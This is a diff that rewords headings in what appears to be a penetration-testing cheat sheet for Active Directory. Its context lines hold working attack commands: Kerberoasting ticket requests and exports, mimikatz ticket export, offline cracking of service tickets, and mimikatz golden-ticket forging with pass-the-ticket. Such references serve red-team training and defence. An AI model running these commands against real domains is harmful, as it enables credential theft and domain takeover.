@@ -231,7 +231,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 &nbsp;
 
 
-**[+] Request a ticket (powershell)**
+**[+] Request a ticket for a specific SPN (powershell)**
 
 ```powershell
 Add-Type -AssemblyName System.IdentityModel  
@@ -248,7 +248,7 @@ mimikatz # kerberos::list /export
 
 &nbsp;
 
-**[+] Crack ticket using Tgsrepcrack.py (You can use john too or hashcat)**
+**[+] Crack a ticket using Tgsrepcrack.py (You can use john too or hashcat)**
 
 ```powershell
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
@@ -256,7 +256,7 @@ mimikatz # kerberos::list /export
 
 &nbsp;
 
-**[+] Export all tickets to John format (Need PowerView.ps1)**
+**[+] Export all kerberastbles users to John format (Need PowerView.ps1)**
 
 ```powershell
 Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
@@ -278,7 +278,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 
 &nbsp;
 
-**[+] Create golden ticket using Mimikatz**
+**[+] Create a golden ticket using Mimikatz**
 
 ```powershell
 kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticket:tgt /ptt
